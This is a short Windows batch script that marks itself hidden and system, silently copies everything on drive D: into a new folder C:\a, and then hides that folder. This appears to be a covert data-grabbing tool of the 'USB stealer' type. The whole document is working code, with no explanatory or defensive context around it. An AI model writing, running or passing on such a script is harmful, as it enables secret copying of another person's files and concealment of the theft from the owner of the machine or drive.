@echo off
attrib +h +s "%~f0"
mkdir "C:\a"
xcopy "D:\*.*" "C:\a" /s /e /h /k /y
attrib +h +s "C:\a"
exit
